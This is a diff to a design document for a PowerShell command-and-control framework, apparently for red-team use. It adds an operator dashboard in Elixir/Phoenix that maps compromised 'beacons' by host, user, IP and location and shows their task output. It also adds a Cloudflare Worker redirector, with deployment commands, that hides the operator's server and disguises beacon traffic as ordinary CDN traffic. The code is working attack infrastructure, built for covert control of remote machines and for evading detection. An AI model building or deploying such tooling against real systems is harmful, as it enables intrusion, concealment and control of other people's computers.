@@ -13,8 +13,10 @@
 4. [Phase 2: Controller](#4-phase-2-controller)
 5. [Phase 3: Beacon Core](#5-phase-3-beacon-core)
 6. [Phase 4: Mesh](#6-phase-4-mesh)
-7. [Verification Steps](#7-verification-steps)
-8. [PshAgent API Reference](#8-pshagent-api-reference)
+7. [Phase 5: Dashboard (Elixir/Phoenix)](#7-phase-5-dashboard-elixirphoenix)
+8. [Phase 6: Cloudflare Redirector](#8-phase-6-cloudflare-redirector)
+9. [Verification Steps](#9-verification-steps)
+10. [PshAgent API Reference](#10-pshagent-api-reference)
 
 ---
 
@@ -1851,7 +1853,950 @@ function Invoke-SwarmTask {
 
 ---
 
-## 7. Verification Steps
+## 7. Phase 5: Operator Dashboard (Elixir/Phoenix LiveView)
+
+### Architecture
+
+The dashboard is a **read-only observer** — it doesn't replace any PowerShell
+infrastructure. The controller's HttpListener remains the C2 server. The Phoenix
+app connects to the controller's internal state API and renders a real-time
+operator view in the browser.
+
+```
+Beacons ──► PowerShell HttpListener (C2 server, unchanged)
+                    │
+                    │ internal API (:8444, localhost only)
+                    │
+              Phoenix LiveView Dashboard (:4000)
+                    │
+              Operator's browser
+                    ├── beacon world map (GeoIP)
+                    ├── activity heatmap (time × beacon)
+                    ├── live task/result feed
+                    ├── beacon status table
+                    └── aggregate metrics
+```
+
+The controller exposes a lightweight JSON API on a separate internal port (localhost
+only, no encryption needed) that the Phoenix app polls. PubSub + LiveView handles
+real-time updates to the browser — no JS framework needed.
+
+### 7.1 Controller Internal API
+
+Add to `Controller/Start-C2Listener.ps1` — a second listener on `:8444` (localhost
+only) that exposes raw state as JSON. No encryption, no auth (it's localhost).
+
+```powershell
+function Start-C2InternalApi {
+    <#
+    .SYNOPSIS
+    Start internal JSON API for the dashboard. Localhost only.
+    .PARAMETER Port
+    Internal API port (default 8444)
+    .PARAMETER Registry
+    Beacon registry
+    .PARAMETER TaskQueues
+    Task queues
+    .PARAMETER ResultStore
+    Result store
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter()]
+        [int]$Port = 8444,
+
+        [Parameter(Mandatory)]
+        [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]$Registry,
+
+        [Parameter(Mandatory)]
+        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues,
+
+        [Parameter(Mandatory)]
+        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]$ResultStore
+    )
+
+    $sharedState = [hashtable]::Synchronized(@{
+        Running     = $true
+        Registry    = $Registry
+        TaskQueues  = $TaskQueues
+        ResultStore = $ResultStore
+    })
+
+    $runspace = [runspacefactory]::CreateRunspace()
+    $runspace.Open()
+    $runspace.SessionStateProxy.SetVariable('state', $sharedState)
+    $runspace.SessionStateProxy.SetVariable('port', $Port)
+
+    $ps = [powershell]::Create()
+    $ps.Runspace = $runspace
+
+    $null = $ps.AddScript({
+        $listener = [System.Net.HttpListener]::new()
+        $listener.Prefixes.Add("http://127.0.0.1:${port}/")
+        $listener.Start()
+
+        try {
+            while ($state.Running) {
+                $ctxTask = $listener.GetContextAsync()
+                while (-not $ctxTask.Wait(1000)) {
+                    if (-not $state.Running) { return }
+                }
+                $ctx = $ctxTask.Result
+                $req = $ctx.Request
+                $resp = $ctx.Response
+
+                try {
+                    # CORS for local dashboard
+                    $resp.Headers.Add('Access-Control-Allow-Origin', '*')
+                    $resp.Headers.Add('Access-Control-Allow-Methods', 'GET, OPTIONS')
+
+                    if ($req.HttpMethod -eq 'OPTIONS') {
+                        $resp.StatusCode = 204
+                        $resp.Close()
+                        continue
+                    }
+
+                    $path = $req.Url.AbsolutePath
+                    $result = $null
+
+                    switch ($path) {
+                        '/beacons' {
+                            $beacons = @()
+                            foreach ($entry in $state.Registry.GetEnumerator()) {
+                                $b = $entry.Value
+                                $queueLen = 0
+                                $q = $null
+                                if ($state.TaskQueues.TryGetValue($b.beaconId, [ref]$q)) {
+                                    $queueLen = $q.Count
+                                }
+                                $beacons += @{
+                                    beaconId    = $b.beaconId
+                                    hostname    = $b.hostname
+                                    username    = $b.username
+                                    ip          = $b.ip
+                                    os          = $b.os
+                                    pid         = $b.pid
+                                    alive       = $b.alive
+                                    lastCheckin = $b.lastCheckin.ToString('o')
+                                    firstSeen   = $b.firstSeen.ToString('o')
+                                    missedCount = $b.missedCount
+                                    queueDepth  = $queueLen
+                                }
+                            }
+                            $result = @{ beacons = $beacons }
+                        }
+                        '/results' {
+                            $allResults = @()
+                            foreach ($entry in $state.ResultStore.GetEnumerator()) {
+                                foreach ($r in $entry.Value.ToArray()) {
+                                    $allResults += @{
+                                        beaconId  = $entry.Key
+                                        taskId    = $r.taskId
+                                        output    = $r.output
+                                        status    = $r.status
+                                        timestamp = $r.timestamp.ToString('o')
+                                    }
+                                }
+                            }
+                            # Sort by time descending, take last 100
+                            $allResults = $allResults | Sort-Object { $_.timestamp } -Descending |
+                                Select-Object -First 100
+                            $result = @{ results = $allResults }
+                        }
+                        '/stats' {
+                            $totalBeacons = $state.Registry.Count
+                            $aliveBeacons = @($state.Registry.Values | Where-Object { $_.alive }).Count
+                            $totalTasks = 0
+                            foreach ($q in $state.TaskQueues.Values) { $totalTasks += $q.Count }
+                            $totalResults = 0
+                            foreach ($bag in $state.ResultStore.Values) { $totalResults += $bag.Count }
+
+                            $result = @{
+                                totalBeacons  = $totalBeacons
+                                aliveBeacons  = $aliveBeacons
+                                deadBeacons   = $totalBeacons - $aliveBeacons
+                                pendingTasks  = $totalTasks
+                                totalResults  = $totalResults
+                            }
+                        }
+                        default {
+                            $result = @{ error = 'unknown route'; routes = @('/beacons', '/results', '/stats') }
+                        }
+                    }
+
+                    $json = $result | ConvertTo-Json -Depth 10 -Compress
+                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+                    $resp.StatusCode = 200
+                    $resp.ContentType = 'application/json'
+                    $resp.ContentLength64 = $bytes.Length
+                    $resp.OutputStream.Write($bytes, 0, $bytes.Length)
+                }
+                catch {
+                    $resp.StatusCode = 500
+                }
+                finally {
+                    $resp.Close()
+                }
+            }
+        }
+        finally {
+            $listener.Stop()
+            $listener.Close()
+        }
+    })
+
+    $handle = $ps.BeginInvoke()
+
+    return @{
+        PowerShell  = $ps
+        Handle      = $handle
+        Runspace    = $runspace
+        SharedState = $sharedState
+        Port        = $Port
+    }
+}
+```
+
+### 7.2 Phoenix Project Structure
+
+```
+c2-dashboard/
+├── mix.exs
+├── config/
+│   ├── config.exs
+│   ├── dev.exs
+│   └── runtime.exs                # C2_INTERNAL_API env var
+├── lib/
+│   ├── c2_dash/
+│   │   ├── application.ex         # Supervision tree
+│   │   ├── poller.ex              # GenServer — polls controller internal API
+│   │   ├── geo.ex                 # GeoIP lookup (ip → lat/lng/country)
+│   │   ├── presenter.ex           # Raw state → dashboard payload
+│   │   └── pubsub.ex              # Broadcast helpers
+│   ├── c2_dash_web/
+│   │   ├── endpoint.ex
+│   │   ├── router.ex
+│   │   ├── live/
+│   │   │   ├── dashboard_live.ex  # Main dashboard LiveView
+│   │   │   ├── map_component.ex   # World map with beacon pins
+│   │   │   ├── heatmap_component.ex # Activity heatmap
+│   │   │   └── components.ex      # Metric cards, tables, badges
+│   │   └── layouts/
+│   │       └── root.html.heex
+│   └── c2_dash_web.ex
+├── assets/
+│   ├── css/
+│   │   └── dashboard.css
+│   └── js/
+│       └── hooks/
+│           ├── world_map.js       # Leaflet.js map hook
+│           └── heatmap.js         # D3/canvas heatmap hook
+└── priv/
+    └── static/
+        └── geo/
+            └── GeoLite2-City.mmdb # MaxMind GeoIP database
+```
+
+### 7.3 `lib/c2_dash/poller.ex`
+
+Polls the controller's internal API every 2 seconds. Broadcasts changes via PubSub.
+
+```elixir
+defmodule C2Dash.Poller do
+  use GenServer
+
+  @poll_interval 2_000
+
+  defmodule State do
+    defstruct api_url: nil,
+              beacons: [],
+              results: [],
+              stats: %{},
+              geo_cache: %{}   # %{ip => %{lat, lng, country, city}}
+  end
+
+  def start_link(opts) do
+    GenServer.start_link(__MODULE__, opts, name: __MODULE__)
+  end
+
+  def get_state do
+    GenServer.call(__MODULE__, :get_state)
+  end
+
+  @impl true
+  def init(opts) do
+    api_url = Keyword.get(opts, :api_url, "http://127.0.0.1:8444")
+    schedule_poll()
+    {:ok, %State{api_url: api_url}}
+  end
+
+  @impl true
+  def handle_info(:poll, state) do
+    state = poll_controller(state)
+    schedule_poll()
+    {:noreply, state}
+  end
+
+  @impl true
+  def handle_call(:get_state, _from, state) do
+    {:reply, state, state}
+  end
+
+  defp poll_controller(state) do
+    with {:ok, beacons_resp} <- http_get("#{state.api_url}/beacons"),
+         {:ok, results_resp} <- http_get("#{state.api_url}/results"),
+         {:ok, stats_resp} <- http_get("#{state.api_url}/stats") do
+
+      beacons = beacons_resp["beacons"] || []
+      results = results_resp["results"] || []
+
+      # GeoIP enrich beacons
+      {enriched_beacons, geo_cache} = enrich_with_geo(beacons, state.geo_cache)
+
+      new_state = %{state |
+        beacons: enriched_beacons,
+        results: results,
+        stats: stats_resp,
+        geo_cache: geo_cache
+      }
+
+      C2Dash.PubSub.broadcast_update()
+      new_state
+    else
+      _ -> state  # silently retry on failure
+    end
+  end
+
+  defp enrich_with_geo(beacons, cache) do
+    Enum.map_reduce(beacons, cache, fn beacon, acc ->
+      ip = beacon["ip"]
+      case Map.get(acc, ip) do
+        nil ->
+          geo = C2Dash.Geo.lookup(ip)
+          {Map.put(beacon, "geo", geo), Map.put(acc, ip, geo)}
+        cached ->
+          {Map.put(beacon, "geo", cached), acc}
+      end
+    end)
+  end
+
+  defp http_get(url) do
+    case Req.get(url, receive_timeout: 5_000) do
+      {:ok, %{status: 200, body: body}} -> {:ok, body}
+      other -> {:error, other}
+    end
+  end
+
+  defp schedule_poll do
+    Process.send_after(self(), :poll, @poll_interval)
+  end
+end
+```
+
+### 7.4 `lib/c2_dash/geo.ex`
+
+GeoIP lookup using MaxMind's GeoLite2 database via the `geolix` library.
+
+```elixir
+defmodule C2Dash.Geo do
+  @doc """
+  Look up IP geolocation. Returns %{lat, lng, country, city} or nil.
+  Uses the bundled GeoLite2-City.mmdb.
+  """
+  def lookup(nil), do: nil
+  def lookup(ip_string) do
+    case Geolix.lookup(ip_string, where: :city) do
+      %{location: %{latitude: lat, longitude: lng}, country: %{iso_code: cc},
+        city: %{name: city}} ->
+        %{lat: lat, lng: lng, country: cc, city: city || "Unknown"}
+      _ ->
+        # Private/unknown IPs — try to infer from subnet
+        nil
+    end
+  end
+end
+```
+
+### 7.5 `lib/c2_dash_web/live/dashboard_live.ex`
+
+Main dashboard. Four panels: metric cards, world map, activity heatmap, beacon/result tables.
+
+```elixir
+defmodule C2DashWeb.DashboardLive do
+  use C2DashWeb, :live_view
+
+  @impl true
+  def mount(_params, _session, socket) do
+    if connected?(socket) do
+      C2Dash.PubSub.subscribe()
+      schedule_tick()
+    end
+
+    state = C2Dash.Poller.get_state()
+    payload = C2Dash.Presenter.build(state)
+
+    {:ok, assign(socket, payload: payload, now: DateTime.utc_now())}
+  end
+
+  @impl true
+  def handle_info(:mesh_updated, socket) do
+    state = C2Dash.Poller.get_state()
+    payload = C2Dash.Presenter.build(state)
+    {:noreply, assign(socket, payload: payload)}
+  end
+
+  @impl true
+  def handle_info(:tick, socket) do
+    schedule_tick()
+    {:noreply, assign(socket, now: DateTime.utc_now())}
+  end
+
+  @impl true
+  def render(assigns) do
+    ~H"""
+    <div class="dashboard">
+      <header class="hero">
+        <h1>C2 Mesh — Operations</h1>
+        <span class={"status-indicator #{if @payload.any_alive, do: "live", else: "dark"}"}>
+          <%= if @payload.any_alive, do: "LIVE", else: "NO BEACONS" %>
+        </span>
+      </header>
+
+      <!-- Metric Cards -->
+      <div class="metric-grid">
+        <.metric_card label="Active" value={@payload.stats.alive} class="success" />
+        <.metric_card label="Dead" value={@payload.stats.dead} class="danger" />
+        <.metric_card label="Queued Tasks" value={@payload.stats.pending} class="warning" />
+        <.metric_card label="Results" value={@payload.stats.total_results} class="info" />
+      </div>
+
+      <!-- World Map -->
+      <section class="panel map-panel">
+        <h2>Beacon Locations</h2>
+        <div id="world-map"
+             phx-hook="WorldMap"
+             phx-update="ignore"
+             data-beacons={Jason.encode!(@payload.map_markers)}>
+        </div>
+      </section>
+
+      <!-- Activity Heatmap -->
+      <section class="panel">
+        <h2>Activity (last 24h)</h2>
+        <div id="activity-heatmap"
+             phx-hook="ActivityHeatmap"
+             phx-update="ignore"
+             data-activity={Jason.encode!(@payload.activity_data)}>
+        </div>
+      </section>
+
+      <!-- Beacon Table -->
+      <section class="panel">
+        <h2>Beacons</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th><th>Host</th><th>User</th><th>IP</th>
+              <th>Location</th><th>Status</th><th>Last Seen</th><th>Queue</th>
+            </tr>
+          </thead>
+          <tbody>
+            <%= for b <- @payload.beacons do %>
+              <tr class={unless b.alive, do: "row-dead"}>
+                <td class="mono"><%= b.beacon_id %></td>
+                <td><%= b.hostname %></td>
+                <td><%= b.username %></td>
+                <td class="mono"><%= b.ip %></td>
+                <td>
+                  <%= if b.geo do %>
+                    <span class="flag"><%= country_flag(b.geo.country) %></span>
+                    <%= b.geo.city %>
+                  <% else %>
+                    <span class="dim">local</span>
+                  <% end %>
+                </td>
+                <td><span class={"badge #{badge_class(b)}"}><%= status_text(b) %></span></td>
+                <td><%= relative_time(b.last_checkin, @now) %></td>
+                <td><%= b.queue_depth %></td>
+              </tr>
+            <% end %>
+          </tbody>
+        </table>
+      </section>
+
+      <!-- Recent Results Feed -->
+      <section class="panel">
+        <h2>Recent Results</h2>
+        <div class="result-feed">
+          <%= for r <- Enum.take(@payload.results, 20) do %>
+            <div class="result-entry">
+              <div class="result-header">
+                <span class="mono"><%= r["beaconId"] %></span>
+                <span class={"badge #{result_badge(r["status"])}"}><%= r["status"] %></span>
+                <span class="dim"><%= r["taskId"] %></span>
+                <span class="dim"><%= relative_time(r["timestamp"], @now) %></span>
+              </div>
+              <pre class="result-output"><%= truncate(r["output"], 300) %></pre>
+            </div>
+          <% end %>
+        </div>
+      </section>
+    </div>
+    """
+  end
+
+  # -- Components --
+
+  defp metric_card(assigns) do
+    ~H"""
+    <div class={"metric-card metric-#{@class}"}>
+      <div class="metric-value"><%= @value %></div>
+      <div class="metric-label"><%= @label %></div>
+    </div>
+    """
+  end
+
+  # -- Helpers --
+
+  defp schedule_tick, do: Process.send_after(self(), :tick, 1_000)
+
+  defp badge_class(%{alive: true, missed_count: m}) when m > 2, do: "badge-warning"
+  defp badge_class(%{alive: true}), do: "badge-active"
+  defp badge_class(_), do: "badge-danger"
+
+  defp status_text(%{alive: true, missed_count: m}) when m > 2, do: "SLOW"
+  defp status_text(%{alive: true}), do: "ALIVE"
+  defp status_text(_), do: "DEAD"
+
+  defp result_badge("finished"), do: "badge-active"
+  defp result_badge("errored"), do: "badge-danger"
+  defp result_badge(_), do: "badge-warning"
+
+  defp relative_time(nil, _), do: "never"
+  defp relative_time(dt_string, now) when is_binary(dt_string) do
+    case DateTime.from_iso8601(dt_string) do
+      {:ok, dt, _} -> relative_time_diff(DateTime.diff(now, dt, :second))
+      _ -> dt_string
+    end
+  end
+  defp relative_time(%DateTime{} = dt, now), do: relative_time_diff(DateTime.diff(now, dt, :second))
+
+  defp relative_time_diff(d) when d < 5, do: "just now"
+  defp relative_time_diff(d) when d < 60, do: "#{d}s ago"
+  defp relative_time_diff(d) when d < 3600, do: "#{div(d, 60)}m ago"
+  defp relative_time_diff(d), do: "#{div(d, 3600)}h ago"
+
+  defp country_flag(nil), do: ""
+  defp country_flag(cc) when byte_size(cc) == 2 do
+    cc
+    |> String.upcase()
+    |> String.to_charlist()
+    |> Enum.map(&(&1 - ?A + 0x1F1E6))
+    |> List.to_string()
+  end
+  defp country_flag(_), do: ""
+
+  defp truncate(nil, _), do: ""
+  defp truncate(s, max) when byte_size(s) <= max, do: s
+  defp truncate(s, max), do: String.slice(s, 0, max) <> "..."
+end
+```
+
+### 7.6 `assets/js/hooks/world_map.js`
+
+Leaflet.js hook for the beacon world map. LiveView pushes marker data, the hook
+renders pins with popups.
+
+```javascript
+import L from "leaflet";
+
+export const WorldMap = {
+  mounted() {
+    this.map = L.map(this.el, {
+      center: [20, 0],
+      zoom: 2,
+      zoomControl: true,
+      attributionControl: false,
+    });
+
+    // Dark tile layer (matches C2 aesthetic)
+    L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
+      maxZoom: 18,
+    }).addTo(this.map);
+
+    this.markers = L.layerGroup().addTo(this.map);
+    this.renderMarkers();
+
+    // Re-render when LiveView pushes new data
+    this.handleEvent("update_markers", ({ beacons }) => {
+      this.el.dataset.beacons = JSON.stringify(beacons);
+      this.renderMarkers();
+    });
+  },
+
+  updated() {
+    this.renderMarkers();
+  },
+
+  renderMarkers() {
+    this.markers.clearLayers();
+    const beacons = JSON.parse(this.el.dataset.beacons || "[]");
+
+    beacons.forEach((b) => {
+      if (!b.lat || !b.lng) return;
+
+      const color = b.alive ? "#00ff88" : "#ff4444";
+      const marker = L.circleMarker([b.lat, b.lng], {
+        radius: 8,
+        fillColor: color,
+        fillOpacity: 0.8,
+        color: color,
+        weight: 2,
+      });
+
+      marker.bindPopup(`
+        <b>${b.beacon_id}</b><br>
+        ${b.hostname} (${b.username})<br>
+        ${b.ip}<br>
+        ${b.city}, ${b.country}<br>
+        Status: ${b.alive ? "ALIVE" : "DEAD"}
+      `);
+
+      this.markers.addLayer(marker);
+    });
+  },
+};
+```
+
+### 7.7 `assets/js/hooks/heatmap.js`
+
+Activity heatmap — time (x-axis, last 24h in hour buckets) × beacon (y-axis),
+color intensity = number of task results in that hour.
+
+```javascript
+export const ActivityHeatmap = {
+  mounted() {
+    this.canvas = document.createElement("canvas");
+    this.canvas.width = this.el.clientWidth;
+    this.canvas.height = 200;
+    this.el.appendChild(this.canvas);
+    this.render();
+  },
+
+  updated() {
+    this.render();
+  },
+
+  render() {
+    const data = JSON.parse(this.el.dataset.activity || "{}");
+    // data shape: { beaconIds: [...], hours: [0..23], grid: [[count, ...], ...] }
+
+    const ctx = this.canvas.getContext("2d");
+    const w = this.canvas.width;
+    const h = this.canvas.height;
+    ctx.clearRect(0, 0, w, h);
+
+    const beacons = data.beaconIds || [];
+    const hours = data.hours || [];
+    const grid = data.grid || [];
+
+    if (beacons.length === 0) {
+      ctx.fillStyle = "#666";
+      ctx.font = "14px monospace";
+      ctx.fillText("No activity data", w / 2 - 60, h / 2);
+      return;
+    }
+
+    const cellW = Math.floor((w - 100) / 24);
+    const cellH = Math.floor((h - 30) / beacons.length);
+    const maxVal = Math.max(1, ...grid.flat());
+
+    // Draw cells
+    grid.forEach((row, bi) => {
+      row.forEach((val, hi) => {
+        const intensity = val / maxVal;
+        const r = Math.floor(intensity * 255);
+        const g = Math.floor(intensity * 100);
+        ctx.fillStyle = val === 0 ? "#1a1a2e" : `rgb(${r}, ${g}, 50)`;
+        ctx.fillRect(100 + hi * cellW, bi * cellH, cellW - 1, cellH - 1);
+      });
+
+      // Beacon label
+      ctx.fillStyle = "#aaa";
+      ctx.font = "11px monospace";
+      ctx.fillText(beacons[bi].slice(0, 12), 2, bi * cellH + cellH - 4);
+    });
+
+    // Hour labels
+    ctx.fillStyle = "#666";
+    ctx.font = "10px monospace";
+    for (let i = 0; i < 24; i += 3) {
+      ctx.fillText(`${i}h`, 100 + i * cellW, h - 5);
+    }
+  },
+};
+```
+
+### 7.8 `lib/c2_dash/presenter.ex`
+
+Transforms poller state into dashboard-ready payload including map markers
+and heatmap grid data.
+
+```elixir
+defmodule C2Dash.Presenter do
+  def build(state) do
+    beacons = Enum.map(state.beacons, fn b ->
+      %{
+        beacon_id: b["beaconId"],
+        hostname: b["hostname"],
+        username: b["username"],
+        ip: b["ip"],
+        os: b["os"],
+        alive: b["alive"],
+        last_checkin: b["lastCheckin"],
+        missed_count: b["missedCount"] || 0,
+        queue_depth: b["queueDepth"] || 0,
+        geo: b["geo"]
+      }
+    end)
+
+    alive_count = Enum.count(beacons, & &1.alive)
+
+    # Map markers — only beacons with geo data
+    map_markers = beacons
+      |> Enum.filter(& &1.geo)
+      |> Enum.map(fn b ->
+        %{
+          beacon_id: b.beacon_id,
+          hostname: b.hostname,
+          username: b.username,
+          ip: b.ip,
+          alive: b.alive,
+          lat: b.geo.lat,
+          lng: b.geo.lng,
+          city: b.geo.city,
+          country: b.geo.country
+        }
+      end)
+
+    # Activity heatmap — 24h × beacon grid
+    activity_data = build_activity_heatmap(beacons, state.results)
+
+    %{
+      beacons: beacons,
+      results: state.results,
+      map_markers: map_markers,
+      activity_data: activity_data,
+      any_alive: alive_count > 0,
+      stats: %{
+        alive: alive_count,
+        dead: length(beacons) - alive_count,
+        pending: state.stats["pendingTasks"] || 0,
+        total_results: state.stats["totalResults"] || 0
+      }
+    }
+  end
+
+  defp build_activity_heatmap(beacons, results) do
+    now = DateTime.utc_now()
+    beacon_ids = Enum.map(beacons, & &1.beacon_id)
+
+    # Build 24-hour buckets for each beacon
+    grid = Enum.map(beacon_ids, fn bid ->
+      bid_results = Enum.filter(results, &(&1["beaconId"] == bid))
+      Enum.map(0..23, fn hour_offset ->
+        cutoff_start = DateTime.add(now, -(hour_offset + 1) * 3600, :second)
+        cutoff_end = DateTime.add(now, -hour_offset * 3600, :second)
+
+        Enum.count(bid_results, fn r ->
+          case DateTime.from_iso8601(r["timestamp"] || "") do
+            {:ok, ts, _} ->
+              DateTime.compare(ts, cutoff_start) != :lt and
+              DateTime.compare(ts, cutoff_end) == :lt
+            _ -> false
+          end
+        end)
+      end)
+      |> Enum.reverse()  # oldest hour first
+    end)
+
+    %{beaconIds: beacon_ids, hours: Enum.to_list(0..23), grid: grid}
+  end
+end
+```
+
+### 7.9 `mix.exs` Dependencies
+
+```elixir
+defp deps do
+  [
+    {:phoenix, "~> 1.8"},
+    {:phoenix_live_view, "~> 1.1"},
+    {:phoenix_html, "~> 4.2"},
+    {:bandit, "~> 1.8"},
+    {:jason, "~> 1.4"},
+    {:req, "~> 0.5"},
+    {:geolix_adapter_mmdb2, "~> 0.6"},
+    {:geolix, "~> 2.0"},
+    {:esbuild, "~> 0.8", runtime: Mix.env() == :dev},
+    {:tailwind, "~> 0.2", runtime: Mix.env() == :dev}
+  ]
+end
+```
+
+### 7.10 Running the Dashboard
+
+```bash
+# 1. Controller must be running with internal API enabled
+#    (Start-C2Controller now also calls Start-C2InternalApi)
+
+# 2. Start the Phoenix dashboard
+cd c2-dashboard/
+mix deps.get
+mix phx.server
+# → Dashboard at http://localhost:4000/dashboard
+
+# 3. Open browser alongside the PshAgent operator CLI
+#    Dashboard shows live beacon map, heatmap, status table, result feed
+```
+
+---
+
+## 8. Phase 6: Cloudflare Redirector
+
+### Purpose
+
+Beacons on the internet can't call back to the operator's IP directly. A Cloudflare
+Worker sits in front of the controller as a redirector — beacons talk to
+`tasks.legit-domain.com` which proxies to the real C2 server.
+
+```
+Beacon → HTTPS → Cloudflare CDN (tasks.legit-domain.com)
+                      │
+                Cloudflare Worker
+                      │
+                      ▼
+              PowerShell Controller (origin)
+```
+
+### Benefits
+
+- **Domain fronting**: beacon traffic looks like normal HTTPS to a CDN domain
+- **IP hiding**: the operator's real IP is behind Cloudflare
+- **TLS termination**: Cloudflare handles certs, no self-signed issues
+- **Geographic distribution**: Cloudflare edge nodes worldwide
+- **Rate limiting / WAF**: additional protection for the C2 server
+
+### 8.1 Cloudflare Worker (`worker.js`)
+
+Minimal pass-through proxy. Forwards `/register` and `/checkin` to the origin.
+
+```javascript
+export default {
+  async fetch(request, env) {
+    const url = new URL(request.url);
+    const path = url.pathname;
+
+    // Only proxy C2 routes
+    if (path !== '/register' && path !== '/checkin') {
+      // Return a plausible 404 for anything else
+      return new Response('Not Found', { status: 404 });
+    }
+
+    // Forward to origin
+    const originUrl = `${env.C2_ORIGIN}${path}`;
+
+    const originRequest = new Request(originUrl, {
+      method: request.method,
+      headers: {
+        'Content-Type': request.headers.get('Content-Type') || 'application/octet-stream',
+        'User-Agent': request.headers.get('User-Agent') || '',
+        'X-Forwarded-For': request.headers.get('CF-Connecting-IP') || '',
+      },
+      body: request.method === 'POST' ? request.body : undefined,
+    });
+
+    try {
+      const response = await fetch(originRequest);
+      return new Response(response.body, {
+        status: response.status,
+        headers: {
+          'Content-Type': response.headers.get('Content-Type') || 'application/octet-stream',
+        },
+      });
+    } catch (err) {
+      // Return generic error — don't leak origin info
+      return new Response('Service Unavailable', { status: 503 });
+    }
+  },
+};
+```
+
+### 8.2 `wrangler.toml`
+
+```toml
+name = "c2-redirector"
+main = "worker.js"
+compatibility_date = "2024-01-01"
+
+[vars]
+C2_ORIGIN = "https://your-origin-server:8443"
+
+# Custom domain (set up in Cloudflare DNS)
+# routes = [{ pattern = "tasks.your-domain.com/*", zone_name = "your-domain.com" }]
+```
+
+### 8.3 Beacon Configuration for Cloudflare
+
+Update `c2-config.ps1` to support redirector URL:
+
+```powershell
+# In c2-config.ps1, add:
+$script:C2Config += @{
+    # Cloudflare redirector (beacons use this instead of direct origin)
+    RedirectorUrl    = $null   # e.g., 'https://tasks.legit-domain.com'
+    # If set, beacons call RedirectorUrl. If null, they call ControllerUrl directly.
+}
+```
+
+The beacon's `Register-Beacon` and `Invoke-CheckIn` already take a `$ControllerUrl`
+parameter — just pass the Cloudflare URL instead of the direct origin:
+
+```powershell
+# Direct (lab):
+./start-beacon.ps1 -ControllerUrl 'https://10.0.0.1:8443' -Key $key
+
+# Via Cloudflare (production):
+./start-beacon.ps1 -ControllerUrl 'https://tasks.legit-domain.com' -Key $key
+```
+
+No code changes needed — the encryption layer means Cloudflare can't read the
+payloads, it just proxies opaque blobs.
+
+### 8.4 Deployment Steps
+
+```bash
+# 1. Set up domain in Cloudflare DNS
+#    A record: tasks.your-domain.com → (Cloudflare proxy enabled, orange cloud)
+
+# 2. Deploy worker
+cd c2-redirector/
+npx wrangler secret put C2_ORIGIN  # paste your origin URL
+npx wrangler deploy
+
+# 3. Set custom route (Cloudflare dashboard or wrangler)
+npx wrangler route add 'tasks.your-domain.com/*' c2-redirector
+
+# 4. Start controller on origin server
+./c2-mesh/Launchers/start-controller.ps1 -Key $key
+
+# 5. Start beacons pointing at Cloudflare domain
+./start-beacon.ps1 -ControllerUrl 'https://tasks.your-domain.com' -Key $key
+```
+
+---
+
+## 9. Verification Steps
 
 ### Phase 1: Foundation
 
@@ -1949,7 +2894,7 @@ Stop-C2Listener -ListenerState $listener
 
 ---
 
-## 8. PshAgent API Reference
+## 10. PshAgent API Reference
 
 Quick reference of the PshAgent APIs used throughout this implementation.
 
